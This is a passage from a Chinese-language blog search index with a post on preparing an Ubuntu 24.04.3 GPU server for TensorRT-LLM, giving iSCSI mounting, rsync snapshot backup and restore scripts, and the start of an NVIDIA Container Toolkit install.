<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记一次尝试Ubuntu 24.04.3 + TensorRT-LLM + DeepSeekv3</title>
      <link href="/2025/08/11/ji-yi-ci-chang-shi-ubuntu-24-04-3-tensorrt-llm-deepseekv3/"/>
      <url>/2025/08/11/ji-yi-ci-chang-shi-ubuntu-24-04-3-tensorrt-llm-deepseekv3/</url>
      
        <content type="html"><![CDATA[<p>尝试一下部署TensorRT-LLM + Qwen2.5-72B<br>配置：Ubuntu 24.04.3，L20 48GB ×2，Xeon 6530 ×2，256GB 内存</p><span id="more"></span><h2 id="一、前置工作"><a href="#一、前置工作" class="headerlink" title="一、前置工作"></a>一、前置工作</h2><h3 id="1-备份还原点"><a href="#1-备份还原点" class="headerlink" title="1.备份还原点"></a>1.备份还原点</h3><p>未思胜先思败，先整一下备份用于搞坏了还原。</p><h4 id="登录并挂载-iSCSI-磁盘："><a href="#登录并挂载-iSCSI-磁盘：" class="headerlink" title="登录并挂载 iSCSI 磁盘："></a>登录并挂载 iSCSI 磁盘：</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iscsiadm <span class="token parameter variable">-m</span> discovery <span class="token parameter variable">-t</span> sendtargets <span class="token parameter variable">-p</span> ip:3260<span class="token function">sudo</span> iscsiadm <span class="token parameter variable">-m</span> <span class="token function">node</span> <span class="token parameter variable">--login</span><span class="token function">sudo</span> iscsiadm <span class="token parameter variable">-m</span> <span class="token function">node</span> <span class="token parameter variable">--op</span> update <span class="token parameter variable">-n</span> node.startup <span class="token parameter variable">-v</span> automaticlsblk</code></pre><h4 id="配置CHAP（如无可忽略）"><a href="#配置CHAP（如无可忽略）" class="headerlink" title="配置CHAP（如无可忽略）"></a>配置CHAP（如无可忽略）</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">nano</span> /etc/iscsi/iscsid.conf<span class="token comment">#找到并修改</span>node.session.auth.authmethod <span class="token operator">=</span> CHAPnode.session.auth.username <span class="token operator">=</span> 你的CHAP用户名node.session.auth.password <span class="token operator">=</span> 你的CHAP密码<span class="token function">sudo</span> systemctl restart open-iscsi</code></pre><h4 id="格式化挂载硬盘"><a href="#格式化挂载硬盘" class="headerlink" title="格式化挂载硬盘"></a>格式化挂载硬盘</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 格式化为 ext4 文件系统</span><span class="token function">sudo</span> mkfs.ext4 /dev/sdb<span class="token comment"># 创建挂载目录并挂载</span><span class="token function">sudo</span> <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /mnt/iscsi_backup<span class="token function">sudo</span> <span class="token function">mount</span> /dev/sdb /mnt/iscsi_backup<span class="token function">df</span> <span class="token parameter variable">-Th</span> /mnt/iscsi_backup</code></pre><h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/usr/bin/env bash</span><span class="token comment"># system_backup.sh</span><span class="token comment"># 全量 + 增量 备份到 /mnt/iscsi_backup，采用 rsync + 硬链接快照</span><span class="token comment"># 需要 root 运行：sudo /usr/local/bin/system_backup.sh</span><span class="token builtin class-name">set</span> <span class="token parameter variable">-euo</span> pipefail<span class="token comment">### ===== 配置区 =====</span><span class="token assign-left variable">SOURCE</span><span class="token operator">=</span><span class="token string">"/"</span>                                   <span class="token comment"># 备份源（系统根）</span><span class="token assign-left variable">TARGET_MOUNT</span><span class="token operator">=</span><span class="token string">"/mnt/iscsi_backup"</span>             <span class="token comment"># iSCSI 挂载点</span><span class="token assign-left variable">SNAPSHOT_DIR</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$&#123;TARGET_MOUNT&#125;</span>/system_snapshots"</span>  <span class="token comment"># 备份根目录</span><span class="token assign-left variable">LOG_FILE</span><span class="token operator">=</span><span class="token string">"/var/log/system_backup.log"</span>        <span class="token comment"># 日志</span><span class="token assign-left variable">LOCK_FILE</span><span class="token operator">=</span><span class="token string">"/var/run/system_backup.lock"</span>      <span class="token comment"># 防重入锁</span><span class="token assign-left variable">RETAIN</span><span class="token operator">=</span><span class="token number">3</span>                                   <span class="token comment"># 保留最近 N 个快照（设 0 不清理）</span><span class="token assign-left variable">DATE_TAG</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%Y%m%d-%H%M%S<span class="token variable">)</span></span>"</span>            <span class="token comment"># 快照后缀</span><span class="token assign-left variable">NEW_SNAP</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$&#123;SNAPSHOT_DIR&#125;</span>/snap_<span class="token variable">$&#123;DATE_TAG&#125;</span>"</span>  <span class="token comment"># 新快照目录</span><span class="token assign-left variable">RSYNC_BIN</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">command</span> <span class="token parameter variable">-v</span> <span class="token function">rsync</span><span class="token variable">)</span></span>"</span><span class="token assign-left variable">SHA256_BIN</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">command</span> <span class="token parameter variable">-v</span> sha256sum <span class="token operator">||</span> <span class="token boolean">true</span><span class="token variable">)</span></span>"</span> <span class="token comment"># 可选：生成校验清单</span><span class="token assign-left variable">PIGZ_BIN</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">command</span> <span class="token parameter variable">-v</span> pigz <span class="token operator">||</span> <span class="token boolean">true</span><span class="token variable">)</span></span>"</span>        <span class="token comment"># 仅供你后续扩展压缩使用</span><span class="token comment"># 排除清单（按需增删）</span><span class="token assign-left variable">RSYNC_EXCLUDES</span><span class="token operator">=</span><span class="token punctuation">(</span>  <span class="token string">"--exclude=<span class="token variable">$&#123;TARGET_MOUNT&#125;</span>"</span>  <span class="token string">"--exclude=/proc"</span>  <span class="token string">"--exclude=/sys"</span>  <span class="token string">"--exclude=/dev"</span>  <span class="token string">"--exclude=/run"</span>  <span class="token string">"--exclude=/tmp"</span>  <span class="token string">"--exclude=/lost+found"</span>  <span class="token string">"--exclude=/swapfile"</span>  <span class="token string">"--exclude=/var/tmp"</span>  <span class="token comment"># 若用 Docker/容器，可考虑排除镜像缓存：</span>  <span class="token string">"--exclude=/var/lib/docker/overlay2"</span>  <span class="token string">"--exclude=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs"</span><span class="token punctuation">)</span><span class="token comment"># 可选：备份前停止/静默数据库等，避免不一致（按需启用）</span><span class="token function-name function">PRE_HOOK</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token builtin class-name">:</span>  <span class="token comment"># 例：systemctl stop mysql || true</span>  <span class="token comment"># 例：docker exec -t pg_container pg_dumpall -U postgres > "$&#123;TARGET_MOUNT&#125;/pg_dump_$&#123;DATE_TAG&#125;.sql" || true</span><span class="token punctuation">&#125;</span><span class="token comment"># 可选：备份后恢复服务（与 PRE_HOOK 对应）</span><span class="token function-name function">POST_HOOK</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token builtin class-name">:</span>  <span class="token comment"># 例：systemctl start mysql || true</span><span class="token punctuation">&#125;</span><span class="token comment">### ===== 配置区结束 =====</span><span class="token function-name function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token builtin class-name">echo</span> <span class="token string">"[<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token string">'+%F %T'</span><span class="token variable">)</span></span>] <span class="token variable">$*</span>"</span> <span class="token operator">|</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> <span class="token string">"<span class="token variable">$LOG_FILE</span>"</span><span class="token punctuation">&#125;</span><span class="token function-name function">cleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$LOCK_FILE</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token function">rm</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$LOCK_FILE</span>"</span>  <span class="token keyword">fi</span><span class="token punctuation">&#125;</span><span class="token builtin class-name">trap</span> cleanup EXIT<span class="token function-name function">require_root</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token environment constant">$EUID</span> <span class="token parameter variable">-ne</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"请使用 root 运行：sudo <span class="token variable">$0</span>"</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;2</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span>  <span class="token keyword">fi</span><span class="token punctuation">&#125;</span><span class="token function-name function">check_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  require_root  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$LOCK_FILE</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    log <span class="token string">"检测到已有运行锁（<span class="token variable">$LOCK_FILE</span>），退出。"</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span>  <span class="token keyword">fi</span>  <span class="token function">touch</span> <span class="token string">"<span class="token variable">$LOCK_FILE</span>"</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-z</span> <span class="token string">"<span class="token variable">$RSYNC_BIN</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    log <span class="token string">"未找到 rsync，正在安装..."</span>    <span class="token function">apt-get</span> update <span class="token parameter variable">-y</span> <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token function">rsync</span>  <span class="token keyword">fi</span>  <span class="token keyword">if</span> <span class="token operator">!</span> mountpoint <span class="token parameter variable">-q</span> <span class="token string">"<span class="token variable">$TARGET_MOUNT</span>"</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    log <span class="token string">"错误：<span class="token variable">$TARGET_MOUNT</span> 未挂载，请先确认 iSCSI 已挂载。"</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span>  <span class="token keyword">fi</span>  <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> <span class="token string">"<span class="token variable">$SNAPSHOT_DIR</span>"</span>  <span class="token function">touch</span> <span class="token string">"<span class="token variable">$LOG_FILE</span>"</span> <span class="token operator">||</span> <span class="token punctuation">&#123;</span> <span class="token builtin class-name">echo</span> <span class="token string">"无法写入日志 <span class="token variable">$LOG_FILE</span>，请检查权限"</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;2</span><span class="token punctuation">;</span> <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>  <span class="token comment"># 写入测试</span>  <span class="token builtin class-name">local</span> <span class="token assign-left variable">testfile</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$&#123;TARGET_MOUNT&#125;</span>/.backup_write_test_<span class="token variable">$&#123;DATE_TAG&#125;</span>"</span>  <span class="token builtin class-name">echo</span> <span class="token string">"write test <span class="token variable"><span class="token variable">$(</span><span class="token function">date</span><span class="token variable">)</span></span>"</span> <span class="token operator">></span> <span class="token string">"<span class="token variable">$testfile</span>"</span> <span class="token operator">||</span> <span class="token punctuation">&#123;</span> log <span class="token string">"错误：无法写入 <span class="token variable">$TARGET_MOUNT</span>"</span><span class="token punctuation">;</span> <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>  <span class="token function">rm</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$testfile</span>"</span>  <span class="token comment"># 简单空间检查（源大小估算困难，这里只检查目标可用空间 > 5GB）</span>  <span class="token builtin class-name">local</span> avail_kb  <span class="token assign-left variable">avail_kb</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">df</span> <span class="token parameter variable">-Pk</span> <span class="token string">"<span class="token variable">$TARGET_MOUNT</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'NR==2&#123;print $4&#125;'</span><span class="token variable">)</span></span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$avail_kb</span>"</span> <span class="token parameter variable">-lt</span> <span class="token number">5242880</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    log <span class="token string">"警告：目标盘可用空间 &lt; 5GB，可能不足。"</span>  <span class="token keyword">fi</span><span class="token punctuation">&#125;</span><span class="token function-name function">latest_snapshot</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment"># 返回最新快照的绝对路径（无则空）</span>  <span class="token builtin class-name">local</span> latest  <span class="token assign-left variable">latest</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">ls</span> <span class="token parameter variable">-1dt</span> <span class="token string">"<span class="token variable">$&#123;SNAPSHOT_DIR&#125;</span>"</span>/snap_* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n1</span> <span class="token operator">||</span> <span class="token boolean">true</span><span class="token variable">)</span></span>  <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$latest</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> readlink <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$latest</span>"</span> <span class="token operator">||</span> <span class="token builtin class-name">echo</span> <span class="token string">""</span><span class="token punctuation">&#125;</span><span class="token function-name function">do_backup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token builtin class-name">local</span> last_snap  <span class="token assign-left variable">last_snap</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span>latest_snapshot<span class="token variable">)</span></span>"</span>  log <span class="token string">"开始备份：源=<span class="token variable">$&#123;SOURCE&#125;</span>"</span>  log <span class="token string">"目标快照目录：<span class="token variable">$&#123;NEW_SNAP&#125;</span>"</span>  <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> <span class="token string">"<span class="token variable">$NEW_SNAP</span>"</span>  PRE_HOOK <span class="token operator">||</span> <span class="token boolean">true</span>  <span class="token comment"># 组装 rsync 参数</span>  <span class="token builtin class-name">local</span> <span class="token parameter variable">-a</span> <span class="token assign-left variable">ARGS</span><span class="token operator">=</span><span class="token punctuation">(</span>    <span class="token parameter variable">-aAXHvv</span>                         <span class="token comment"># 权限/ACL/硬链接/高详细</span>    --numeric-ids                   <span class="token comment"># 保持 UID/GID 数字</span>    <span class="token parameter variable">--delete</span>                        <span class="token comment"># 使快照与源一致（仅作用于当次快照目录）</span>    <span class="token parameter variable">--inplace</span>                       <span class="token comment"># 更新大文件时原地写，减少空间需求</span>    <span class="token parameter variable">--partial</span>                       <span class="token comment"># 支持断点续传</span>    <span class="token parameter variable">--info</span><span class="token operator">=</span>STATS2,PROGRESS2  <span class="token punctuation">)</span>  <span class="token comment"># 增量：使用 --link-dest 指向“上一次快照”，未变化文件硬链接过去</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$last_snap</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token assign-left variable">ARGS</span><span class="token operator">+=</span><span class="token punctuation">(</span> <span class="token string">"--link-dest=<span class="token variable">$&#123;last_snap&#125;</span>"</span> <span class="token punctuation">)</span>    log <span class="token string">"检测到上一次快照：<span class="token variable">$&#123;last_snap&#125;</span>，启用增量模式（硬链接）。"</span>  <span class="token keyword">else</span>    log <span class="token string">"未检测到历史快照，本次将执行全量备份。"</span>  <span class="token keyword">fi</span>  <span class="token comment"># 加入排除参数</span>  <span class="token assign-left variable">ARGS</span><span class="token operator">+=</span><span class="token punctuation">(</span> <span class="token string">"<span class="token variable">$&#123;RSYNC_EXCLUDES<span class="token punctuation">[</span>@<span class="token punctuation">]</span>&#125;</span>"</span> <span class="token punctuation">)</span>  <span class="token comment"># 执行 rsync</span>  log <span class="token string">"执行 rsync 同步中..."</span>  <span class="token string">"<span class="token variable">$RSYNC_BIN</span>"</span> <span class="token string">"<span class="token variable">$&#123;ARGS<span class="token punctuation">[</span>@<span class="token punctuation">]</span>&#125;</span>"</span> <span class="token string">"<span class="token variable">$SOURCE</span>"</span> <span class="token string">"<span class="token variable">$NEW_SNAP</span>"</span> <span class="token operator">|</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> <span class="token string">"<span class="token variable">$LOG_FILE</span>"</span>  POST_HOOK <span class="token operator">||</span> <span class="token boolean">true</span>  <span class="token comment"># 生成可选校验清单（耗时，按需启用）</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$SHA256_BIN</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    log <span class="token string">"生成快照校验清单（可能较耗时）..."</span>    <span class="token punctuation">(</span>cd <span class="token string">"<span class="token variable">$NEW_SNAP</span>"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-print0</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-0</span> <span class="token string">"<span class="token variable">$SHA256_BIN</span>"</span> <span class="token operator">></span> <span class="token string">"MANIFEST_<span class="token variable">$&#123;DATE_TAG&#125;</span>.sha256"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token boolean">true</span>  <span class="token keyword">fi</span>  log <span class="token string">"备份完成：<span class="token variable">$&#123;NEW_SNAP&#125;</span>"</span><span class="token punctuation">&#125;</span><span class="token function-name function">prune_old</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$RETAIN</span>"</span> <span class="token parameter variable">-le</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">return</span> <span class="token number">0</span>  <span class="token builtin class-name">local</span> snaps  <span class="token builtin class-name">mapfile</span> <span class="token parameter variable">-t</span> snaps <span class="token operator">&lt;</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token function">ls</span> <span class="token parameter variable">-1dt</span> <span class="token string">"<span class="token variable">$&#123;SNAPSHOT_DIR&#125;</span>"</span>/snap_* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">||</span> <span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token builtin class-name">local</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$&#123;<span class="token operator">#</span>snaps<span class="token punctuation">[</span>@<span class="token punctuation">]</span>&#125;</span>"</span>  <span class="token keyword">if</span> <span class="token variable"><span class="token punctuation">((</span> count <span class="token operator">></span> RETAIN <span class="token punctuation">))</span></span><span class="token punctuation">;</span> <span class="token keyword">then</span>    log <span class="token string">"开始清理旧快照，保留最近 <span class="token variable">$&#123;RETAIN&#125;</span> 个。"</span>    <span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span>RETAIN<span class="token punctuation">;</span> i<span class="token operator">&lt;</span>count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>      log <span class="token string">"删除旧快照：<span class="token variable">$&#123;snaps<span class="token punctuation">[</span>$i<span class="token punctuation">]</span>&#125;</span>"</span>      <span class="token function">rm</span> <span class="token parameter variable">-rf</span> --one-file-system <span class="token string">"<span class="token variable">$&#123;snaps<span class="token punctuation">[</span>$i<span class="token punctuation">]</span>&#125;</span>"</span> <span class="token operator">||</span> <span class="token boolean">true</span>    <span class="token keyword">done</span>  <span class="token keyword">fi</span><span class="token punctuation">&#125;</span><span class="token function-name function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  check_env  do_backup  prune_old  log <span class="token string">"全部完成。"</span><span class="token punctuation">&#125;</span>main <span class="token string">"<span class="token variable">$@</span>"</span></code></pre><h4 id="设置定时任务"><a href="#设置定时任务" class="headerlink" title="设置定时任务"></a>设置定时任务</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">crontab</span> <span class="token parameter variable">-e</span><span class="token number">30</span> <span class="token number">2</span> * * * /usr/local/bin/system_backup.sh <span class="token operator">></span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre><h4 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h4><p>脚本需要在 LiveCD&#x2F;救援环境 下以 root 运行。<br>把脚本保存为 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;system_restore.sh，赋予执行权限：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /usr/local/bin<span class="token function">sudo</span> <span class="token function">nano</span> /usr/local/bin/system_restore.sh   <span class="token comment"># 粘贴脚本</span><span class="token function">sudo</span> <span class="token function">chmod</span> +x /usr/local/bin/system_restore.sh</code></pre><pre class="language-system_restore.sh" data-language="system_restore.sh"><code class="language-system_restore.sh">#!&#x2F;usr&#x2F;bin&#x2F;env bash# system_restore.sh# 从 &#x2F;mnt&#x2F;iscsi_backup&#x2F;system_snapshots&#x2F; 选择一次快照，恢复到本机系统盘# 需在 LiveCD&#x2F;救援环境中以 root 运行set -euo pipefail### &#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 配置区（按需修改） &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;# 目标系统盘与分区（你当前机器的实际布局）DISK&#x3D;&quot;&#x2F;dev&#x2F;nvme0n1&quot;PART_EFI&#x3D;&quot;&#x2F;dev&#x2F;nvme0n1p1&quot;PART_BOOT&#x3D;&quot;&#x2F;dev&#x2F;nvme0n1p2&quot;LV_ROOT&#x3D;&quot;&#x2F;dev&#x2F;mapper&#x2F;ubuntu--vg-ubuntu--lv&quot;   # 根 LV（已存在的 LVM 卷）# 备份盘（iSCSI 或本地）挂载点与快照目录BACKUP_MNT&#x3D;&quot;&#x2F;mnt&#x2F;iscsi_backup&quot;SNAPSHOT_DIR&#x3D;&quot;$&#123;BACKUP_MNT&#125;&#x2F;system_snapshots&quot;# 恢复目标挂载点TARGET&#x3D;&quot;&#x2F;mnt&#x2F;restore&quot;# rsync 选项（务必保留 A X H numeric-ids 和 --delete）RSYNC_ARGS&#x3D;(-aAXHvv --numeric-ids --delete --info&#x3D;STATS2,PROGRESS2)# 若你需要跳过某些目录（一般不需要），可在这里追加：EXCLUDES&#x3D;( )### &#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 配置区结束 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;log()&#123; echo &quot;[$(date &#39;+%F %T&#39;)] $*&quot;; &#125;require_root()&#123;  if [[ $EUID -ne 0 ]]; then    echo &quot;请使用 root 运行：sudo $0&quot; &gt;&amp;2    exit 1  fi&#125;confirm()&#123;  read -r -p &quot;⚠️ 本操作将用所选快照覆盖 $&#123;TARGET&#125;（实际为你的系统盘挂载点）。确认继续？(yes&#x2F;NO): &quot; ans  [[ &quot;$&#123;ans:-&#125;&quot; &#x3D;&#x3D; &quot;yes&quot; ]] || &#123; echo &quot;已取消。&quot;; exit 1; &#125;&#125;activate_lvm()&#123;  log &quot;激活 LVM 卷组...&quot;  vgchange -ay &gt;&#x2F;dev&#x2F;null || true&#125;mount_targets()&#123;  log &quot;创建挂载点...&quot;  mkdir -p &quot;$TARGET&quot; &quot;$TARGET&#x2F;boot&quot; &quot;$TARGET&#x2F;boot&#x2F;efi&quot;  if ! mountpoint -q &quot;$TARGET&quot;; then    log &quot;挂载根卷 $&#123;LV_ROOT&#125; 到 $&#123;TARGET&#125; ...&quot;    mount &quot;$LV_ROOT&quot; &quot;$TARGET&quot;  fi  if ! mountpoint -q &quot;$TARGET&#x2F;boot&quot;; then    log &quot;挂载 &#x2F;boot 分区 $&#123;PART_BOOT&#125; ...&quot;    mount &quot;$PART_BOOT&quot; &quot;$TARGET&#x2F;boot&quot;  fi  if ! mountpoint -q &quot;$TARGET&#x2F;boot&#x2F;efi&quot;; then    log &quot;挂载 EFI 分区 $&#123;PART_EFI&#125; ...&quot;    mount &quot;$PART_EFI&quot; &quot;$TARGET&#x2F;boot&#x2F;efi&quot;  fi&#125;mount_backup()&#123;  if ! mountpoint -q &quot;$BACKUP_MNT&quot;; then    log &quot;尝试挂载备份盘到 $&#123;BACKUP_MNT&#125;（如果是本地 &#x2F;dev&#x2F;sdX 盘请自行 mount）...&quot;    mkdir -p &quot;$BACKUP_MNT&quot;    # 如需自动挂载本地盘，可在此添加：mount &#x2F;dev&#x2F;sdX &quot;$BACKUP_MNT&quot;  fi  if [[ ! -d &quot;$SNAPSHOT_DIR&quot; ]]; then    echo &quot;未找到快照目录：$SNAPSHOT_DIR&quot; &gt;&amp;2    exit 1  fi&#125;pick_snapshot()&#123;  local latest  latest&#x3D;$(ls -1dt &quot;$&#123;SNAPSHOT_DIR&#125;&quot;&#x2F;snap_* 2&gt;&#x2F;dev&#x2F;null | head -n1 || true)  if [[ -z &quot;$latest&quot; ]]; then    echo &quot;未发现任何快照：$SNAPSHOT_DIR&quot; &gt;&amp;2    exit 1  fi  echo &quot;检测到以下快照（最新在前）：&quot;  ls -1dt &quot;$&#123;SNAPSHOT_DIR&#125;&quot;&#x2F;snap_* | head -n 20  echo  read -r -p &quot;输入要恢复的快照完整路径（直接回车使用最新：$&#123;latest&#125;）: &quot; chosen  SNAP&#x3D;&quot;$&#123;chosen:-$latest&#125;&quot;  if [[ ! -d &quot;$SNAP&quot; ]]; then    echo &quot;快照目录无效：$SNAP&quot; &gt;&amp;2    exit 1  fi  log &quot;使用快照：$SNAP&quot;&#125;do_restore()&#123;  confirm  log &quot;开始 rsync 同步（这将覆盖目标系统）...&quot;  local args&#x3D;( &quot;$&#123;RSYNC_ARGS[@]&#125;&quot; )  for e in &quot;$&#123;EXCLUDES[@]:-&#125;&quot;; do args+&#x3D;( &quot;--exclude&#x3D;$e&quot; ); done  rsync &quot;$&#123;args[@]&#125;&quot; \    &quot;$SNAP&quot;&#x2F; &quot;$TARGET&quot;&#x2F;  log &quot;同步完成。&quot;&#125;chroot_fix_boot()&#123;  log &quot;绑定必要的伪文件系统...&quot;  mount --bind &#x2F;dev  &quot;$TARGET&#x2F;dev&quot;  mount --bind &#x2F;proc &quot;$TARGET&#x2F;proc&quot;  mount --bind &#x2F;sys  &quot;$TARGET&#x2F;sys&quot;  log &quot;进入 chroot 修复引导与内核镜像...&quot;  chroot &quot;$TARGET&quot; bash -c &quot;    set -e    echo &#39;更新 initramfs...&#39;    update-initramfs -u    if [[ -d &#x2F;sys&#x2F;firmware&#x2F;efi ]]; then      echo &#39;检测到 EFI 引导，安装&#x2F;修复 grub-efi...&#39;      grub-install --target&#x3D;x86_64-efi --efi-directory&#x3D;&#x2F;boot&#x2F;efi --bootloader-id&#x3D;ubuntu --recheck    else      echo &#39;BIOS&#x2F;Legacy 引导，安装 grub 到磁盘...&#39;      grub-install $&#123;DISK&#125;    fi    echo &#39;更新 grub 配置...&#39;    update-grub  &quot;  log &quot;解除绑定...&quot;  umount -lf &quot;$TARGET&#x2F;dev&quot; || true  umount -lf &quot;$TARGET&#x2F;proc&quot; || true  umount -lf &quot;$TARGET&#x2F;sys&quot;  || true&#125;summary()&#123;  log &quot;恢复完成！你可以执行：&quot;  echo &quot;  umount -R $TARGET&quot;  echo &quot;  reboot&quot;&#125;main()&#123;  require_root  activate_lvm  mount_targets  mount_backup  pick_snapshot  do_restore  chroot_fix_boot  summary&#125;main &quot;$@&quot;</code></pre><h3 id="2-安装NVIDIA-Container-Toolkit-TensorRT-LLM"><a href="#2-安装NVIDIA-Container-Toolkit-TensorRT-LLM" class="headerlink" title="2.安装NVIDIA Container Toolkit &amp; TensorRT-LLM"></a>2.安装NVIDIA Container Toolkit &amp; TensorRT-LLM</h3><h4 id="NVIDIA-Container-Toolkit"><a href="#NVIDIA-Container-Toolkit" class="headerlink" title="NVIDIA Container Toolkit"></a>NVIDIA Container Toolkit</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1.Configure the production repository:</span><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://nvidia.github.io/libnvidia-container/gpgkey <span class="token operator">|</span> <span class="token function">sudo</span> gpg <span class="token parameter variable">--dearmor</span> <span class="token parameter variable">-o</span> 